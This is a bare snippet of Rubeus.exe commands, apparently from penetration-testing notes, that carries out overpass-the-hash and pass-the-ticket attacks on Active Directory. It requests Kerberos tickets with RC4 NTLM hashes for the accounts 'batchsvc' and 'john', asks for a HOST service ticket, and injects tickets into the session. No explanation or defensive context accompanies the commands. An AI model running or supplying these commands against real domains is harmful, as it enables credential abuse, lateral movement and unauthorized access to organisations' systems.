
```
Rubeus.exe asktgt /user:batchsvc /enctype:RC4 /rc4:10EE9D3F6DA987CAC9357548FADB7F7B /domain:internal.msp.local /dc:internal-dc01.internal.msp.local
Rubeus.exe asktgs /ticket:<ticket> /service:HOST/internal-batch.internal.msp.local /domain:internal.msp.local /dc:internal-dc01.internal.msp.local
Rubeus.exe ptt /ticket:<ticket>
```
```
Rubeus.exe asktgt /domain:test.local /user:john /rc4:2a3de7fe356ee524cc9f3d579f2e0aa7 /ptt

```
